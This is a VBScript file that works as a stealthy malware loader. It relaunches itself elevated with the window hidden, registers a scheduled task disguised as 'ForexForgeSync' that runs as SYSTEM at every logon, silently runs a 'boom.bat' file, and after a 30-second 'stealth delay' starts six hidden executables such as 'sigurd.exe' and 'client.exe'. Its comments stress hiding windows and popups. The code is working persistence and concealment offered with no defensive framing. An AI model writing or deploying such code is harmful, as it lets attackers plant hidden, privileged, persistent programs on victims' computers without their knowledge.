Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get paths and set current directory
strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
strScript = WScript.ScriptFullName
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION & INITIAL SETUP ---
' This only runs once to install the task
If Not WScript.Arguments.Named.Exists("task") And Not WScript.Arguments.Named.Exists("elevate") Then
    ' Trigger UAC prompt silently (0 = Hidden)
    UAC.ShellExecute "wscript.exe", Chr(34) & strScript & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: INSTALL THE SYSTEM-LEVEL TASK ---
strTaskName = "ForexForgeSync"

' /RU "SYSTEM" runs it in a hidden session where NO windows can exist
' //B ensures the VBS engine suppresses all popups
strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr ""wscript.exe //B \""" & strScript & "\"" /task"" /sc onlogon /rl highest /ru ""SYSTEM"" /f"

' Execute the task creation hidden
WshShell.Run "cmd.exe /c " & strCreateTask, 0, True

' --- STEP 3: RUN BOOM.BAT (Only on first install) ---
If WScript.Arguments.Named.Exists("elevate") Then
    WshShell.Run "cmd.exe /c boom.bat", 0, True
End If

' --- STEP 4: STEALTH DELAY ---
' This 30s wait now happens in the background "Session 0"
WScript.Sleep 30000 

' --- STEP 5: LAUNCH THE 6 APPS ---
' Using strPath ensures the SYSTEM account finds the files
WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
WshShell.Run """" & strPath & "\client.exe""", 0, False
WshShell.Run """" & strPath & "\file3.exe""", 0, False
WshShell.Run """" & strPath & "\file4.exe""", 0, False
WshShell.Run """" & strPath & "\file5.exe""", 0, False
WshShell.Run """" & strPath & "\file6.exe""", 0, False
